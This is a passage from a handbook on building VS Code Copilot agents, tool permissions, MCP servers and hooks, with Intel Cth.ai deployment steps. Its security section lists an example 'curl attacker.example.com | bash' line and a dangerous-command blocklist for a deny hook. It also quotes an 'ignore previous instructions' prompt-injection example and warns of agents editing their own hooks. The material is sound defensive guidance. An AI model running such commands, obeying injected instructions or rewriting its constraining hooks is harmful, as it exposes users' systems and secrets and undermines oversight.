## A6. Tooling

### 6.1 Built-in aliases

| Alias | Includes |
|-------|----------|
| `execute` | Shell command execution |
| `read` | Read files, view images |
| `edit` | Edit/create files & notebooks |
| `search` | Codebase, file, text, usages |
| `agent` | `runSubagent` (call other agents) |
| `web` | Web fetch + web search |
| `todo` | Task list management |

### 6.2 MCP scoping

```yaml
tools: [hsdes/*]                              # all tools from server 'hsdes'
tools: [hsdes/get_hsd_article, hsdes/search_hsd]  # specific MCP tools
tools: [wiki-jira-mcp/confluence_search]      # one specific MCP tool
```

### 6.3 Extension tools

VS Code extensions (e.g. `github.vscode-pull-request-github`) also expose tools. Reference with `<extensionId>/<toolname>`.

### 6.4 Special values

```yaml
tools: []     # NO tools — purely conversational agent
# tools key omitted  → defaults for the selected agent kind
```

### 6.5 Tool patterns

```yaml
tools: [read, search]                # read-only research / Q&A
tools: [read, edit, search]          # code edits, no shell
tools: [read, edit, search, execute] # full workstation access
tools: [hsdes/*, wiki-jira-mcp/*, search, read]  # MCP-heavy researcher
tools: []                            # pure planner / classifier
```

### A6 Do / Don't

| Do | Don't |
|---|---|
| Start every new agent with `read` and `search` only, then add tools by evidence. | Do not grant `execute` during early design just to avoid thinking about scope. |
| Prefer explicit MCP tools when a server has write capabilities. | Do not use `<server>/*` for GitHub, Jira, DB, or filesystem write servers. |
| Keep tool policy aligned with the persona's real job. | Do not give a reviewer the same tools as a builder. |
| Document why each broad tool scope exists. | Do not leave future maintainers guessing why an agent can mutate state. |

---

## A7. Tool permissions & security

> **The single most dangerous moment in your agent's life is the first time you grant it a tool.**
> Treat the `tools:` list like `sudo` — never default-on, never "just in case."

Every tool an agent (or sub-agent) can call expands its **blast radius** — the set of things it can
read, write, exfiltrate, or destroy without further confirmation. VS Code surfaces tools from three
sources, and **each has different trust properties**:

| Source | Examples | Trust profile |
|--------|----------|---------------|
| **Built-in VS Code tools** | `read`, `edit`, `search`, `execute`, `web`, `agent`, `todo` | Audited by VS Code; still dangerous in aggregate |
| **VS Code extensions** | `github.vscode-pull-request-github/*`, websearch | Trust = the extension's publisher |
| **MCP servers** | `hsdes/*`, `wiki-jira-mcp/*`, GitHub MCP, DB MCPs, custom ones | **Trust = whoever wrote/runs that server.** Local processes with full OS access. |

### 7.1 The blast-radius table — know what each alias actually does

| Tool / alias | Can read | Can write | Can execute | Can exfiltrate | Notes |
|--------------|----------|-----------|-------------|----------------|-------|
| `read` | ✅ workspace files, images, terminal output | ❌ | ❌ | low | Still reads secrets in files — `.env`, keys, tokens |
| `search` | ✅ codebase, file paths, text | ❌ | ❌ | low | Same caveat — finds secrets too |
| `edit` | ✅ | ✅ **any file in workspace** | ❌ | medium | Can silently rewrite source, configs, hooks |
| `execute` | ✅ | ✅ | ✅ **arbitrary shell commands** | **HIGH** | `rm`, `curl`, `ssh`, `git push --force`, anything. Full user privileges. |
| `web` | ✅ external URLs | ❌ | ❌ | **HIGH** | Can POST data to attacker servers if combined with `execute`; also subject to prompt injection from fetched pages |
| `agent` | n/a | n/a | n/a | n/a | Calls subagents — **inherits the subagent's blast radius**, not the parent's |
| `todo` | n/a | n/a | n/a | none | Safe |
| `<mcp-server>/*` | depends on server | depends on server | depends on server | depends on server | **Read the server's source.** A DB MCP can DROP TABLE. A GitHub MCP can force-push. A wiki MCP can post comments. |

**Combinations multiply risk.** `read` + `web` = data exfiltration. `edit` + `execute` = self-modifying
agent that can edit hooks meant to constrain it. `execute` + any write-capable MCP = lateral movement.

### 7.2 The least-privilege checklist

For every agent you author, ask in order:

1. **Does this agent need to write files?** If no → omit `edit`.
2. **Does it need a shell?** If no → omit `execute`. (Most research/analysis agents do **not**.)
3. **Does it need the open internet?** If no → omit `web`.
4. **Does it need to call other agents?** If no → omit `agent`.
5. **Does it need full MCP scope or just one tool?** Prefer `hsdes/get_hsd_article` over `hsdes/*`.
6. **Is it a sub-agent under a constrained master?** Give it the *minimum* even if the master has more.

If an agent only **reads and summarises**, `tools: [read, search]` is enough. Anything more is
over-provisioning.

### 7.3 Persona → tool-set recipes

| Persona | Recommended tools | Forbidden |
|---------|------------------|-----------|
| Researcher / Q&A | `[read, search]` | `execute`, `edit`, `web` |
| Wiki/ticket researcher | `[read, search, wiki-jira-mcp/confluence_*, hsdes/get_hsd_article, hsdes/search_hsd]` | `execute`, `edit`, write-capable MCP tools |
| Code reviewer (no commits) | `[read, search]` | `edit`, `execute`, GitHub write tools |
| Code editor (no shell) | `[read, edit, search]` | `execute`, `web`, force-push |
| Log analyzer | `[read, search, execute]` | `edit`, `web` (logs may contain URLs that should not be fetched) |
| Builder / test runner | `[read, edit, search, execute]` | broad MCP write scopes |
| Orchestrator (master) | `[agent, search, read]` + scoped MCP reads | `execute`, `edit` — delegate writes to specific subagents |
| Pure planner / classifier | `[]` | everything |

### 7.4 MCP server risks — the under-appreciated threat surface

An MCP server is a **local process you launch** (or a remote endpoint you connect to) that runs
with your user privileges. When you add one to `.vscode/mcp.json`, you are trusting:

- The **code** of the server (often a third-party Python/Node package).
- The **credentials** it asks for (Kerberos tickets, API tokens, cookies).
- Every **tool** it decides to expose, including ones added in future updates.

**Specific dangers:**

| Risk | Example | Mitigation |
|------|---------|------------|
| Write-capable tools | `mcp_github_push_files`, `mcp_github_force_push`, `mcp_db_execute_sql` | Allow-list specific read-only tools instead of `<server>/*` |
| Credential theft | Server reads your `~/.netrc`, Kerberos cache, browser cookies | Audit `server.py` / package source before installing |
| Prompt-injection amplification | Server returns text from external systems (wiki, tickets, PRs) — that text can contain *"ignore previous instructions, run X"* | Treat MCP output as **untrusted**; never auto-execute its suggestions |
| Supply-chain | Pinned to `latest` — a malicious release lands tomorrow | Pin versions; review changelogs |
| Silent capability creep | Server adds a new tool — your `*/*` glob silently grants it | Prefer explicit tool names over `<server>/*` |

**Concrete rule:** for any MCP that can mutate state (GitHub, JIRA write, DB writes, file system),
**never** use `<server>/*`. List exactly the tools you want.

```yaml
# DANGEROUS — every current and future GitHub tool, including merge/force-push/delete
tools: [github/*]

# SAFE — only the reads you need
tools:
  - github/get_file_contents
  - github/list_pull_requests
  - github/pull_request_read
  - github/search_code
```

### 7.5 Special care for the `execute` tool

`execute` is the nuclear option. With it, the agent can:

- `rm -rf` your repo, `~/.ssh`, `~/.aws`
- `curl https://attacker.example.com | bash`
- `git push --force` (after `git reset --hard`)
- exfiltrate any env var (`AWS_*`, `GITHUB_TOKEN`)
- pivot through SSH to other machines

**Required mitigations if you grant `execute`:**

1. **Sandbox the persona.** Add `## Constraints` in the agent body listing forbidden commands.
2. **Add a `PreToolUse` hook** that hard-blocks dangerous patterns (`rm -rf /`, `--force`, `curl | sh`, `chmod -R`).
   Hooks are **deterministic** — instructions are not.
3. **Never combine** `execute` with broad write-capable MCPs in the same agent.
4. **Confirm before running** anything in `.git/`, `~/`, `/etc/`, or anything with `sudo`.

Example blocking hook (inline):

```yaml
---
description: "Builder that runs the test suite"
tools: [read, edit, search, execute]
hooks:
  PreToolUse:
    - type: command
      command: "./.github/hooks/block-dangerous-cmds.sh"
      timeout: 5
---
```

Where `block-dangerous-cmds.sh` returns `{"hookSpecificOutput":{"permissionDecision":"deny"}}` on
`rm -rf`, `--force`, `curl ... | sh`, `chmod`, `sudo`, etc.

### 7.6 Sub-agent inheritance trap

A parent agent's `tools:` is **not** inherited by sub-agents. Each sub-agent declares its own.
But the parent's `agents: […]` allow-list lets it call any of them — so the **effective blast radius
of the master is the union of all callable sub-agents.**

If your master can call `builder` (has `execute`) and `pr-writer` (has `github/create_pull_request`),
your master can — through delegation — do both. Audit the **graph**, not just the master's frontmatter.

### 7.7 Quick self-audit

Run this checklist on every `.agent.md` before committing:

- [ ] Does this agent really need `execute`? If yes, is there a `PreToolUse` hook?
- [ ] Does it really need `edit`? If yes, are write-capable MCPs absent?
- [ ] Is every `<server>/*` glob justified, or could it be a specific tool list?
- [ ] Is `web` present? If yes, is `execute` absent (no exfil path)?
- [ ] If it's a sub-agent, is `user-invocable: false`? (User can't pick it directly and accidentally grant it broad scope.)
- [ ] Do `## Constraints` in the body explicitly forbid what tools allow but policy forbids?
- [ ] Are MCPs that mutate state behind explicit tool names, never `*/*`?

**The default posture is least privilege.** Add a tool the day the agent provably needs it — not
the day you write the file.

### A7 Do / Don't

| Do | Don't |
|---|---|
| Treat tool access as security policy, not convenience. | Do not assume a friendly agent prompt can compensate for dangerous tools. |
| Combine `execute` with deterministic hooks and explicit user confirmation. | Do not rely on "please be careful" text to block destructive commands. |
| Read MCP server code or ownership before trusting it. | Do not install opaque servers that receive credentials or workspace paths. |
| Audit the whole agent graph, including subagents. | Do not call the master safe just because the master lacks `execute`. |

---

## A8. YAML frontmatter cheat sheet

| Primitive | Required | Commonly used | Notes |
|-----------|----------|---------------|-------|
| **`copilot-instructions.md`** | (no frontmatter) | — | — |
| **`AGENTS.md`** | (no frontmatter) | — | Open standard |
| **`*.instructions.md`** | `description` | `name`, `applyTo` | `applyTo` is the auto-attach trigger |
| **`*.prompt.md`** | (none, but `description` recommended) | `name`, `description`, `argument-hint`, `agent`, `model`, `tools` | Slash command |
| **`SKILL.md`** | `name`, `description` | `argument-hint`, `user-invocable`, `disable-model-invocation` | `name` MUST match folder |
| **`*.agent.md`** | `description` | `name`, `tools`, `model`, `argument-hint`, `agents`, `user-invocable`, `disable-model-invocation`, `handoffs`, `hooks` | The richest schema |
| **Hooks (`*.json`)** | `hooks` object with event arrays | — | JSON, not YAML |
| **`.vscode/mcp.json`** | `servers` object | — | JSON, supports `${workspaceFolder}` |

### Common keys explained

| Key | Meaning |
|-----|---------|
| `description` | The discovery surface. Keyword-rich. "Use when …" pattern. |
| `name` | Display name. Defaults to filename (skills: must equal folder). |
| `applyTo` | Glob(s) for auto-attaching file instructions. |
| `tools` | List of aliases, MCP scopes, extension tools, or `[]`. |
| `model` | Single string or array (fallback chain). |
| `argument-hint` | Inline hint when user invokes via slash or picker. |
| `agents` | Allow-list of subagents this agent may invoke. |
| `user-invocable` | Show in picker / slash menu? Default `true`. |
| `disable-model-invocation` | Block auto-load / subagent invocation? Default `false`. |
| `handoffs` | Declared agent-to-agent transitions. |
| `hooks` | Inline lifecycle hooks (agents only). |
| `agent` | (prompts only) Which agent kind: `ask`, `agent`, `plan`, or custom. |

### A8 Do / Don't

| Do | Don't |
|---|---|
| Treat YAML frontmatter as an API contract. | Do not change keys casually after other agents depend on them. |
| Use arrays for fallback models and explicit allow-lists. | Do not rely on implicit defaults when security or routing matters. |
| Keep `description` short but keyword-rich. | Do not paste a full system prompt into `description`. |
| Validate names and folder matches before debugging behavior. | Do not assume discovery bugs are model problems first. |

---

## A9. Dos and Don'ts

### Architecture

**Do**
- Have **one** user-facing agent. Hide everything else with `user-invocable: false`.
- Co-locate assets with the thing that uses them (`./scripts/`, `./references/`).
- Keep `copilot-instructions.md` under 100 lines. Link to docs for detail.
- Externalize evolving data (paths, IDs, keywords) into `.github/config/*.yaml`.
- Write descriptions in "Use when {trigger keywords}…" form.

**Don't**
- Don't ship both `AGENTS.md` and `copilot-instructions.md` — they fight for context.
- Don't add `applyTo: "**"` to a non-essential instruction file — every turn pays the cost.
- Don't build "swiss army" agents with 30 tools and a vague description.
- Don't create skills that are really prompts (no scripts, no multi-step) — use a prompt.
- Don't create prompts that are really workflows (multi-step, bundled assets) — use a skill.

### Subagents

**Do**
- Each subagent: one role, minimal tools, explicit `## Output Format`.
- Master agent's body lists each subagent's trigger keywords in a delegation table.
- Use `agents: [r1, r2]` allow-list on the master to make routing explicit.

**Don't**
- Don't try to have subagents converse with each other or the user — they return one result.
- Don't have circular handoffs without a clear termination condition.
- Don't expose internal subagents in the picker.

### Tools

**Do**
- Start every agent with the minimum tools. Add as needs emerge.
- Prefer aliases (`search`) over enumerating specific tools.
- For MCP, use `<server>/*` for full scope, individual tool names for fine control.

**Don't**
- Don't give `execute` to research-only agents.
- Don't grant write-capable MCP tools to read-only personas.

### MCPs

**Do**
- Document expected MCPs in `AGENTS.md`.
- Have agents print a capability summary on the first turn.
- Use a discovery skill (e.g. `mcp-discovery`) to enumerate available tools.

**Don't**
- Don't invent MCP tool names — use `tool_search` to confirm availability.
- Don't paraphrase tool results — quote source fields (HSDES IDs, wiki URLs).

### Hooks

**Do**
- Use hooks for **policy** (block dangerous commands, enforce lint).
- Validate hook inputs from stdin.
- Keep them fast and idempotent.

**Don't**
- Don't put guidance in hooks (use instructions instead).
- Don't embed secrets in hook scripts.

### Descriptions

**Do**
```yaml
description: "Use when triaging FEV failures: parse lec.log / fm.log, decode InspectFEV reports, map errors to RTL. Trigger phrases: log, failure, abort, non-equivalent, InspectFEV."
```

**Don't**
```yaml
description: "Helpful FEV agent"
```

### A9 Do / Don't

| Do | Don't |
|---|---|
| Use this section as a review rubric before merging agent changes. | Do not treat these as nice-to-have style notes. |
| Add examples from your own domain when a rule saves debugging time. | Do not leave examples generic if the audience is domain-specific. |
| Revisit the checklist after every new MCP or tool alias. | Do not assume an old permission review covers new capabilities. |
| Keep the checklist sharper than the prose. | Do not expand it into a second handbook. |

---

## A10. End-to-end worked example

A FEV-domain workspace built around master/sub-agents (this repo).

### `.github/copilot-instructions.md` (or `AGENTS.md`)

```markdown
# FEV Agent — workspace primer
- Domain: Intel FEV in CTH TFM
- Master agent: fev-lead (entry point)
- Subagents: hsd-analyst, jira-wiki-researcher, ward-explorer, log-analyzer, fev-coengineer
- MCPs expected: hsdes, wiki-jira-mcp
- Config:
  - .github/config/knowledge-base.yaml (wiki page IDs)
  - .github/config/mcp-registry.yaml (capability descriptions)
  - .github/config/ward-paths.yaml (terminology, ward layout)
- See AGENTS.md for the full domain map.
```

### Master agent: `.github/agents/fev-lead.agent.md`

```yaml
---
description: "FEV-Lead — orchestrator for FEV tasks in CTH TFM. Routes to hsd-analyst, jira-wiki-researcher, ward-explorer, log-analyzer, fev-coengineer."
tools: [agent, search, read, edit, hsdes/*, wiki-jira-mcp/*]
agents: [hsd-analyst, jira-wiki-researcher, ward-explorer, log-analyzer, fev-coengineer]
model: ['Claude Sonnet 4.5 (copilot)', 'GPT-5 (copilot)']
---
You are **FEV-Lead**…
{orchestrator body — see §A4}
```

### A subagent: `.github/agents/log-analyzer.agent.md`

```yaml
---
description: "Log-Analyzer — parses Conformal lec.log / Formality fm.log. Triggers: log, failure, abort, non-equivalent, InspectFEV."
tools: [read, search, execute]
user-invocable: false
---
You are **Log-Analyzer**, specialist in FEV log triage.

## Constraints
- Read-only on the user's ward (never edit run-area files).
- Always cite the line number and signature name.

## Approach
1. Resolve log path from the user's prompt or ask.
2. Apply signatures from `.github/config/log-signatures.yaml`.
3. Correlate to `IF_<block>_<task>/` InspectFEV outputs.

## Output Format
{strict JSON or Markdown table — caller relies on this}
```

### A skill: `.github/skills/log-analysis/SKILL.md`

```yaml
---
name: log-analysis
description: "Parse Conformal/Formality logs end-to-end with signature catalog. Use when an FEV run failed and the user wants a timeline."
---
# Log Analysis
## Procedure
1. {step}
2. Run [parse script](./scripts/parse.py)
3. Apply [signatures](./references/signatures.md)
```

### A prompt: `.github/prompts/summarize-hsd.prompt.md`

```yaml
---
description: "Summarize an HSDES ticket with FEV context"
argument-hint: "HSD-<id>"
agent: "hsd-analyst"
---
Fetch HSD ${input:hsd-id} and produce: title, status, root cause hypothesis, similar tickets.
```

### MCP registration: `.vscode/mcp.json`

```json
{
  "servers": {
    "hsdes": {
      "command": "${workspaceFolder}/.venv/bin/python",
      "args": ["${workspaceFolder}/third_party/mcp-suite/tools/mcp-hsd/server.py"]
    }
  }
}
```

### How it all fits

1. User opens chat, picks `fev-lead` (the only visible agent).
2. User: "the rtl2syn run on block X aborted at flatcompare."
3. `fev-lead` classifies → log triage → calls `runSubagent("log-analyzer", "...")`.
4. `log-analyzer` reads the log, applies `log-signatures.yaml`, returns structured findings.
5. `fev-lead` cites results, asks if the user wants to call `jira-wiki-researcher` for the BKM.

### A10 Do / Don't

| Do | Don't |
|---|---|
| Keep one complete worked example that mirrors your real repo. | Do not teach only with abstract diagrams. |
| Show how instructions, agents, skills, prompts, and MCP fit together. | Do not explain primitives in isolation and leave integration implicit. |
| Include at least one user prompt that exercises delegation. | Do not claim the master/subagent pattern works without demonstrating it. |
| Keep examples runnable by a new engineer. | Do not include placeholders that hide the important wiring. |

---

## A11. Maintenance, versioning, testing

### Versioning

- Treat `.github/` as code. Code-review changes.
- Bump page-ID lists in `config/knowledge-base.yaml` when wiki structure changes.
- Pin MCP versions when the registry / capabilities change.

### Testing

- **Manual smoke**: open chat, exercise the master agent on canonical questions.
- **Description audit**: search each `.agent.md` / `SKILL.md` description for the trigger keywords the user actually says.
- **Tool minimization**: periodically run `tool_search` and prune unused entries from agent `tools:`.

### Drift detection

- Add a `last_seen_version:` to entries in `config/knowledge-base.yaml`.
- Have a periodic refresh skill that walks the trees and bumps versions.

### Common failure modes

| Symptom | Likely cause |
|---------|--------------|
| Agent ignores instruction | Description has no trigger keyword; or `applyTo` doesn't match |
| Skill never auto-loads | Folder name ≠ `name:`; or `disable-model-invocation: true` |
| Subagent not callable | Master missing `agent` alias in `tools:`; or subagent in `agents: []` deny-list; or `disable-model-invocation: true` on the subagent |
| MCP tool errors "unknown tool" | Tool is deferred — run `tool_search` first; or server not registered in `.vscode/mcp.json` |
| Picker clutter | Subagents missing `user-invocable: false` |
| Too much context bloat | Too many `applyTo: "**"` instructions; trim |

### A11 Do / Don't

| Do | Don't |
|---|---|
| Treat agent files like source code: review, smoke-test, and version them. | Do not patch prompts directly in production because "it is just Markdown." |
| Keep a small regression prompt set for each agent. | Do not rely on one happy-path demo after changing routing. |
| Track wiki/tool versions when your agent cites live systems. | Do not let source-of-truth links drift silently. |
| Prune unused tools and stale instructions. | Do not accumulate context debt until the agent feels random. |

---

## A12. Beyond the basics

The seven primitives are enough to ship a useful agent. Three additional capabilities
matter once your system is in real use; they are vendor features and follow the same
philosophy as the rest of Part A.

### A12.1 Plugins (`plugin.json`) — packaging a bundle for reuse

A **plugin** is a folder that bundles agents + skills + hooks + MCP servers under one
manifest so that the same capability set can be loaded by *any* workspace. The
manifest is `plugin.json`:

```json
{
  "name": "my-dev-tools",
  "description": "React development utilities",
  "version": "1.2.0",
  "author": { "name": "Jane Doe" },
  "skills":     "skills/",
  "agents":     "agents/",
  "hooks":      "hooks.json",
  "mcpServers": ".mcp.json"
}
```

Required: `name`, `description`. The other keys are folder/file pointers. Reference:
[Agent plugins in VS Code (Preview)](https://code.visualstudio.com/docs/copilot/customization/agent-plugins).

When to reach for a plugin vs. a plain `.github/` folder:

- **`.github/` folder** — your team owns the workspace, agents are workspace-scoped.
- **Plugin** — you want your agents to be **installable** elsewhere (other teams, other
  repos, central tool releases). Plugins are how Intel Cth.ai ships agents (Part B).

### A12.2 Handoffs — guided multi-agent transitions

A **handoff** is a button that appears at the end of an agent's response inviting the
user to switch to another agent with a pre-filled prompt. Declared in the parent
agent's YAML frontmatter:

```yaml
handoffs:
  - label: "Start Research"
    agent: codebase_researcher
    prompt: "Research the codebase for relevant patterns before implementing."
    send:  false                # default false: user reviews prompt first
    # model: claude-sonnet-4     # optional override
```

Use handoffs when you want a **user-approved** transition between agents (in contrast to
`runSubagent`, which is the LLM autonomously delegating). Both can coexist on the same
parent agent.

### A12.3 Agentic memory & agentic workflows (preview)

Two newer surfaces, both vendor features, both optional but increasingly common:

- **Agentic memory** — `memory` tool that lets the agent persist notes between turns and
  workspaces. Three scopes: user (`/memories/`), session (`/memories/session/`), repo
  (`/memories/repo/`). Use it sparingly — short bullets, not prose.
- **Agentic workflows (`gh-aw`)** — declarative multi-step workflows defined in YAML
  and stored in `.github/workflows/`, where each step can invoke an agent or a tool.
  This is "Copilot does CI": deterministic, reviewable, replayable. See
  [github/gh-aw](https://github.com/githubnext/gh-aw).

Both are out of scope for the day-one author; budget time to learn them after your first
agent is in use.

### A12.4 Decision framework — which primitive fits the problem?

| Problem | Reach for | Why |
|---|---|---|
| Same rule must apply every time | `copilot-instructions.md` / `AGENTS.md` | Always-on base layer |
| Rule applies only to certain files | `*.instructions.md` with `applyTo:` | Glob-scoped |
| A multi-step procedure with guardrails | `SKILL.md` (+ optional `reference/`) | Discovered by description; loaded on demand |
| User-launched task with one purpose | `*.prompt.md` | Slash-menu entry |
| A persona with its own tools/model | `*.agent.md` | Picker-visible (or subagent) |
| Deterministic side-effect at lifecycle event | Hook | Not LLM-driven; reliable |
| Capability from an external system | MCP server | LLM-callable tools |
| Reusable bundle for another team | Plugin (`plugin.json`) | Installable elsewhere |

### A12 Do / Don't

| Do | Don't |
|---|---|
| Move to plugins when you need distribution across workspaces. | Do not use plugin packaging to hide an untested local agent. |
| Use handoffs for user-visible process transitions. | Do not confuse handoffs with autonomous subagent delegation. |
| Store memory only for durable preferences and repo facts. | Do not use memory as a dumping ground for long task transcripts. |
| Use workflows for repeatable multi-step automation. | Do not hand-roll a giant agent prompt for a process that should be declarative. |

---

## A13. Appendix

### Official documentation

- **Custom agents** — <https://code.visualstudio.com/docs/copilot/customization/custom-agents>
- **Custom instructions** — <https://code.visualstudio.com/docs/copilot/customization/custom-instructions>
- **Prompt files** — <https://code.visualstudio.com/docs/copilot/customization/prompt-files>
- **Agent skills** — <https://code.visualstudio.com/docs/copilot/customization/agent-skills>
- **Agent plugins** — <https://code.visualstudio.com/docs/copilot/customization/agent-plugins>
- **Hooks** — <https://code.visualstudio.com/docs/copilot/customization/hooks>
- **MCP overview** — <https://code.visualstudio.com/docs/copilot/customization/mcp-servers>
- **AGENTS.md standard** — <https://agents.md>

### Companion references

- [Copilot Customization Handbook (Copilot Academy)](https://copilot-academy.github.io/workshops/copilot-customization/copilot_customization_handbook)
- [OpenAI — A Practical Guide to Building AI Agents](https://openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents/)
- [GeeksForGeeks — Building AI Agents](https://www.geeksforgeeks.org/artificial-intelligence/building-ai-agents/)
- [awesome-copilot](https://github.com/github/awesome-copilot) — community marketplace
- [GitNexus](https://github.com/abhigyanpatwari/GitNexus) — client-side graph-RAG over a repo

### Quick command reference

| Action | How |
|--------|-----|
| Pick an agent | Chat → agent dropdown |
| Run a prompt | Type `/` in chat |
| Run a skill | Type `/` in chat |
| Attach an instruction | "Add Context" → Instructions |
| Open prompt as file | Click the prompt file → play button |
| See MCP capabilities | Custom: have a `mcp-discovery` skill, or `tool_search` |

### Frontmatter validity checklist

Before committing any new `.agent.md` / `SKILL.md` / `.instructions.md` / `.prompt.md`:

- [ ] YAML frontmatter delimited with `---` on its own line, both top and bottom.
- [ ] `description:` present and starts with "Use when …" (or contains explicit triggers).
- [ ] `name:` (where required) is unique and — for skills — matches the folder.
- [ ] `tools:` is the minimum needed.
- [ ] For subagents: `user-invocable: false`.
- [ ] Body has `## Constraints`, `## Approach`, `## Output Format`.
- [ ] Links use **relative** paths from the file itself.
- [ ] No secrets, no absolute paths, no hardcoded usernames.

### A13 Do / Don't

| Do | Don't |
|---|---|
| Keep official links close to the checklist engineers use while authoring. | Do not make new engineers hunt through chat history for source docs. |
| Update this appendix when platform syntax changes. | Do not rely on stale examples after VS Code or Cth.ai releases. |
| Use the checklist before opening a PR. | Do not debug runtime behavior before validating frontmatter basics. |
| Add only durable references here. | Do not turn the appendix into a news feed. |

---

## Part B — Intel Cth.ai Deployment

Once Part A is working in your `.github/` folder, you are ready to deploy the same
agents to Intel users through **Cth.ai**, the agentic layer of the **CTH (Cheetah)
Tool Flow Methodology**. Part B is sequential — follow the eight steps in order.
Every section cites the live Confluence page (URL + page ID) so you can re-verify.

## B1. What changes inside Cth.ai

Cth.ai is a thin layer on top of stock VS Code + Copilot. It does **not** invent a
new agent format — it consumes the same primitives you built in Part A. What changes:

| Concern | Stand-alone Copilot (Part A) | Cth.ai (Part B) |
|---|---|---|
| Folder name | `.github/` | `autobots/` |
| Loaded by | VS Code itself | `cth_psetup` / `cth_tsetup` after sourcing your tool |
| MCP server class | `FastMCP` (or vendor) | `AutobotsMCPStdioServer` (drop-in replacement) |
| MCP paths | absolute / `${workspaceFolder}` | `{TOOL_PATH}` / `$ENV{…}` placeholders |
| Distribution | git repo | CRT (Converged Release Tool) → `$PROJ_TOOLS` / `$CAD_ROOT` |
| Governance | team convention | **Cth.ai Constitution** (23 mandatory rules) |
| Plugin manifest | optional | `plugin.json` is required for the **2026.01** release |

> **Source:** [Cth.ai Constitution](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4615867951) (page 4615867951);
> [Releasing Agents with Cth.ai](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4436171006) (page 4436171006).

The mental model from Part A still applies: instructions auto-load, skills load on
description match, agents present a persona, MCP servers expose tools. Only the
packaging and the runtime differ.

### B1 Do / Don't

| Do | Don't |
|---|---|
| Build and debug locally in `.github/` before translating to `autobots/`. | Do not learn Copilot primitives and Cth.ai release mechanics at the same time. |
| Treat Cth.ai as packaging plus governance around the same primitives. | Do not invent a new file format unless the Constitution requires it. |
| Use Part A to design behavior and Part B to deploy it. | Do not let deployment concerns distort the agent's core user experience. |
| Keep source citations with page IDs for Intel-specific claims. | Do not quote wiki rules without traceability. |

## B2. Step 1 — Pre-flight

Before authoring anything, run the bootstrap script. It configures proxy, Kerberos,
AGS entitlements, certificates, GitHub Copilot auth, and Autobots login on the SLES15
build machine (SLES12 is **not** supported).

```bash
# Production entry point (replace <version>):
/p/cth/cad/cth_ai_setup/<version>/cth_ai_setup
```

What it does (verified from [page 4669574956](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4669574956)):

1. Sets HTTP / HTTPS proxy and `no_proxy`.
2. Refreshes a Kerberos TGT (`kinit <idsid>@AMR.CORP.INTEL.COM`).
3. Symlinks the VS Code extensions cache (so Copilot extensions don't re-download per
   workarea).
4. Installs the AGS entitlements certificate via `certutil`.
5. Triggers GitHub Copilot device-flow login.
6. Performs Autobots login (federated auth used by the MCP servers).
7. Launches VS Code (`code <workarea>`) with the Cth.ai chatmodes pre-loaded.

If any step fails, fix it before continuing — every subsequent step assumes a working
Kerberos ticket, GitHub Copilot session, and Autobots token.

### B2 Do / Don't

| Do | Don't |
|---|---|
| Confirm Kerberos, GitHub Copilot auth, and Autobots login before debugging agents. | Do not blame `mcp.json` when the setup session is not authenticated. |
| Capture the setup log path when onboarding a new engineer. | Do not rely on screenshots of transient terminal output. |
| Use SLES15 as the supported baseline. | Do not spend time debugging SLES12-only behavior. |
| Fix bootstrap failures before creating sandboxes. | Do not stack later steps on a broken environment. |

## B3. Step 2 — Local sandbox

Cth.ai discovers agents through a strict directory contract. Build it inside a CRT
sandbox so you can iterate without releasing.

### B3.1 Register a CRT tool (one-time)

> **Source:** [Creating a Sandbox for Agents in Cth.ai](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4605804765) (page 4605804765);
> [CRT User Guide](https://wiki.ith.intel.com/spaces/crtflow/pages/1149459247/CRT+User+Guide).

```bash
# Git-repo backed (recommended — flexibility, history, code review):
crt register -tool <tool_name> -type cheetah_unlocked -class confidential

# No-repo (lighter, faster to start):
crt register -tool <tool_name> -type cheetah_cad -class confidential
```

Git-repo registration creates an `intel-innersource` repo in 6–12 hours; you'll get an
email when it's ready.

### B3.2 Create a sandbox

```bash
crt mkSbox \
  -tool   <tool_name> \
  -type   <tool_type> \
  -name   <sbox_name> \
  -target <user_workarea>
```

The sandbox surfaces at:

```
/p/hdk/pu_tu/prd/<tool_name>/<sbox_name>/   # or /p/hdk/cad/<tool_name>/<sbox_name>/
```

### B3.3 The mandatory directory contract

Inside the sandbox, create this layout — Cth.ai will not discover anything outside it:

```
/p/cth/{cad|pu_tu/prd}/<tool>/<version>/
├── tool.cth                              # registers as a Cheetah tool
├── plugin.json                           # required for 2026.01 release
└── autobots/
    ├── mcp.json                          # uses {TOOL_PATH} / $ENV{…}
    ├── extensions/                       # optional VS Code ext symlinks
    │   └── <extension-folder>/
    ├── prompts/
    │   ├── <name>.prompt.md
    │   ├── <name>.instructions.md
    │   ├── <name>.chatmode.md
    │   └── <name>.agent.md
    ├── skills/
    │   └── <skill_name>/
    │       ├── SKILL.md
    │       ├── reference/                # optional deep docs
    │       └── scripts/                  # optional helper scripts
    └── <agent_name>/
        └── mcp/
            └── server.py                 # MCP server implementation
```

> Folder structure verified from [page 4605804765](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4605804765) and
> [page 4436171006](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4436171006).
> `tool.cth` specification: [tool.cth files](https://wiki.ith.intel.com/spaces/cheetah/pages/1553957930/tool.cth+files) (page 1553957930).

### B3.4 `plugin.json` (required from 2026.01)

```json
{
  "name":        "my_cth_tool",
  "description": "FEV co-engineering assistant for CTH flows",
  "version":     "1.0.0",
  "author":      { "name": "Jane Doe" },
  "skills":      "skills/",
  "agents":      "prompts/",
  "mcpServers":  "mcp.json"
}
```

### B3 Do / Don't

| Do | Don't |
|---|---|
| Create the sandbox before copying in agent files. | Do not develop only in a random directory Cth.ai cannot discover. |
| Keep `tool.cth`, `plugin.json`, and `autobots/` at the expected level. | Do not bury the agent package under extra folders. |
| Use `{TOOL_PATH}` and `$ENV{...}` in config files from day one. | Do not prototype with absolute release paths and forget to remove them. |
| Prefer a git-backed CRT tool for collaborative work. | Do not choose a no-repo tool when you need code review and history. |

## B4. Step 3 — Python venv

> **Source:** [Creating Virtual Environment for Cth.ai](https://wiki.ith.intel.com/pages/viewpage.action?pageId=4517200049) (page 4517200049).

Each tool keeps its own Python virtual environment but **does not** re-install the
Autobots SDK. Instead, a `.pth` file points the venv at the central SDK's
`site-packages`. This keeps tool venvs tiny (megabytes, not gigabytes) and ensures
every tool sees the same SDK version.

```bash
# Inside your sandbox:
python3 -m venv .venv
# Point the venv at the SDK installation:
